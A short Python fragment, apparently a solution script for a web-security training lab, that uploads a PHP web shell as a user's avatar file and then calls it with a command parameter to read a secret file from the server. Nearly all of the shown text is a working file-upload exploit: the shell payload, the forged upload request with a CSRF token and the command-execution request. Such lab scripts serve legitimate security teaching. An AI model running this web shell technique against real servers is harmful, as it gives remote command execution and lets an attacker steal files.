...
def upload_web_shell(url:str, s:requests.Session):
    ...
    params = {'avatar': ('test.test', "<?php echo system($_GET['command']); ?>", 'application/octet-stream'),
              'user': 'wiener',
              'csrf': csrf}
    ...
    req = s.get(url + '/files/avatars/test.test?command=' + 'cat /home/carlos/secret', verify=False, proxies=proxies)
